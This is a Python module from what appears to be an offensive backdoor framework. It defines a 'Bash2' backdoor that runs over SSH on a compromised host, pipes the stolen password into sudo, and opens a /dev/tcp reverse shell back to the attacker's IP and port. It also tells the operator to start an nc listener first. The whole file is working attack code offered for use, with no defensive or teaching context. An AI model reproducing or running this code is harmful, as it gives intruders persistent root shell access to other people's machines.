from backdoor import *
import subprocess
import threading

class Bash2(Backdoor):
    prompt = Fore.RED + "(bash) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using second Bash module..."
        self.core = core
        self.options = {
                "port"   : Option("port", 53923, "port to connect to", True),
                }
        self.allow_modules = True
        self.modules = {} 
        self.help_text = INFO + "A slightly different (and more reliable) version of the other bash backdoor, which does not prompt for the password on the client-side."
    
    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S nohup 0<&196;exec 196<>/dev/tcp/" + self.core.localIP + "/%s; sh <&196 >&196 2>&196" % self.get_value("port")
    
    def do_exploit(self, args):
        port = self.get_value("port")
        target = self.core.curtarget
        print(GOOD + "Initializing backdoor...")
        raw_input("Run the following command: nc -vnlp %s in another shell to start the listener." % port)
        target.ssh.exec_command(self.get_command())

        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()
